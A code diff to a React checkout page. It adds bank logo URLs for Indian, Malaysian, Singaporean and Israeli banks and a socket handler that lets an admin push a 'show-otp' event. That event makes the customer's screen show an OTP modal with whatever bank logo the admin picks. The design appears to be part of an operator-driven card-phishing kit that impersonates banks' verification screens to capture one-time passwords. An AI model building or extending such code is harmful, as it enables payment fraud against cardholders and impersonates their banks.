@@ -29,6 +29,7 @@ import { devLog, devError, devWarn } from '../utils/logger';
 import { v4 as uuidv4 } from 'uuid';
 
 const bankLogos = [
+  // Indian Banks
   'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
   'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
   'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
@@ -49,7 +50,25 @@ const bankLogos = [
   'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
   'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png',
   'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
-  'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
+  'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg',
+  
+  // Malaysian Banks
+  'https://logos-world.net/wp-content/uploads/2023/02/Maybank-Logo-500x281.png',
+  'https://whatthelogo.com/storage/logos/ambank-group-108215.png',
+  'https://logolook.net/wp-content/uploads/2023/12/CIMB-Logo-500x281.png',
+  
+  // Singapore Banks
+  'https://logos-world.net/wp-content/uploads/2023/03/OCBC-Bank-Logo-500x281.png',
+  
+  // International Banks
+  'https://1000logos.net/wp-content/uploads/2017/02/HSBC-symbol-500x148.jpg',
+  
+  // Israeli Banks
+  'https://cdn.freelogovectors.net/svg07/bank-hapoalim-logo.svg',
+  'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png',
+  'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg',
+  'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png',
+  'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg'
 ];
 
 // Card brand logos
@@ -1375,8 +1394,34 @@ const CheckoutOriginal = () => {
     }
     devLog('Registering socket event listeners for paymentId:', paymentId);
     
-    // REMOVED: Duplicate show-otp handler that was causing automatic OTP triggers
-    // The admin-controlled handler is registered elsewhere
+    // Handle admin show-otp command with bank logo data
+    socket.on('show-otp', (data) => {
+      devLog('🏦 Admin show-otp event received:', data);
+      devLog('Current paymentId:', paymentId);
+      devLog('Event paymentId:', data?.paymentId);
+      
+      if (!data || data.paymentId !== paymentId) {
+        devLog('Payment ID mismatch, ignoring show-otp event');
+        return;
+      }
+      
+      // Update admin-selected bank logo from admin panel
+      if (data.bankLogo) {
+        devLog('🏦 Setting admin-selected bank logo:', data.bankLogo);
+        setAdminSelectedBankLogo(data.bankLogo);
+      }
+      
+      // Set OTP page selection if provided
+      if (data.otpPageSelection) {
+        setOtpPageSelection(data.otpPageSelection);
+      }
+      
+      // Show OTP modal
+      setCurrentStep('otp');
+      setShowOtp(true);
+      
+      devLog('✅ OTP modal displayed with admin-selected bank logo');
+    });
     
     socket.on('payment-approved', (data) => {
       devLog('Payment approved event received:', data);
